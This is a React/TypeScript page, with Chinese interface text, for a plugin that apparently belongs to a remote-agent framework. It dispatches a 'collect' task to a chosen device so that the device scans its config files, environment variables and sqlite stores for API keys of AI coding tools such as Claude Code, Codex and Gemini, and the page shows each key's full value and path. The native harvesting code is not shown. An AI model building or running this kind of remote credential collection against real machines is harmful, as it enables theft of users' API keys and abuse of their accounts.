import { useState } from 'react';
import { Button, Card, Chip, Spinner, Table } from '@heroui/react';
import { usePluginHost } from '../../hooks/usePluginHost';

interface AITokenItem {
  vendor: string;
  source: string;
  path: string;
  keyName: string;
  keyValue: string;
}

interface AITokenResult {
  total: number;
  items: AITokenItem[];
}

/**
 * AI 软件 API Key 探测插件页面。
 * 通过 usePluginHost().dispatchTask 调用 native 插件 aitoken 的 collect 动作。
 */
export default function AITokenPage() {
  const { selectedAgent, dispatchTask } = usePluginHost();
  const [running, setRunning] = useState(false);
  const [result, setResult] = useState<AITokenResult | null>(null);
  const [err, setErr] = useState<string | null>(null);

  const run = async () => {
    if (!selectedAgent) return;
    setRunning(true);
    setErr(null);
    setResult(null);
    try {
      const res = await dispatchTask('com.libra.aitoken', 'collect', {});
      setResult(res.result as AITokenResult);
    } catch (e) {
      setErr(e instanceof Error ? e.message : '扫描失败');
    } finally {
      setRunning(false);
    }
  };

  return (
    <div className="space-y-4">
      <Card className="p-6">
        <h1 className="text-xl font-semibold">AI 软件 API Key 探测</h1>
        <p className="text-sm text-default-500 mt-1">
          扫描本机 AI 软件（Claude Code / OpenCode / CodeX / Gemini / OpenClaw / Hermes / CC Switch / DeepSeek Harness 等）的 API Key（配置文件 + 环境变量 + sqlite）。
        </p>
        <div className="mt-4 flex items-center gap-3">
          <Button variant="primary" isPending={running} isDisabled={!selectedAgent} onPress={run}>
            扫描 AI API Key
          </Button>
          {!selectedAgent && <Chip size="sm" color="warning">请先在顶部选择设备</Chip>}
        </div>
      </Card>

      {err && <Card className="p-4 border border-danger"><p className="text-danger text-sm">{err}</p></Card>}

      {running && (
        <div className="flex items-center gap-2 text-default-500"><Spinner size="sm" /> 扫描中…</div>
      )}

      {result && (
        <Card className="p-4">
          <div className="flex items-center gap-2 mb-3">
            <h2 className="font-semibold">扫描结果</h2>
            <Chip size="sm" variant="secondary">{result.total} 条</Chip>
          </div>

          {result.items.length === 0 ? (
            <p className="text-sm text-default-500">未发现 AI 软件 API Key。</p>
          ) : (
            <div className="overflow-x-auto">
              <Table aria-label="ai keys" className="min-w-[700px]">
                <Table.Header>
                  <Table.Column>软件</Table.Column>
                  <Table.Column>Key 名</Table.Column>
                  <Table.Column>Key 值</Table.Column>
                  <Table.Column>来源</Table.Column>
                  <Table.Column>路径</Table.Column>
                </Table.Header>
                <Table.Body>
                  {result.items.map((it, i) => (
                    <Table.Row key={i}>
                      <Table.Cell>{it.vendor}</Table.Cell>
                      <Table.Cell className="font-mono text-xs">{it.keyName}</Table.Cell>
                      <Table.Cell className="font-mono text-xs max-w-[220px] truncate">{it.keyValue}</Table.Cell>
                      <Table.Cell>{it.source}</Table.Cell>
                      <Table.Cell className="font-mono text-xs max-w-[200px] truncate">{it.path}</Table.Cell>
                    </Table.Row>
                  ))}
                </Table.Body>
              </Table>
            </div>
          )}
        </Card>
      )}
    </div>
  );
}
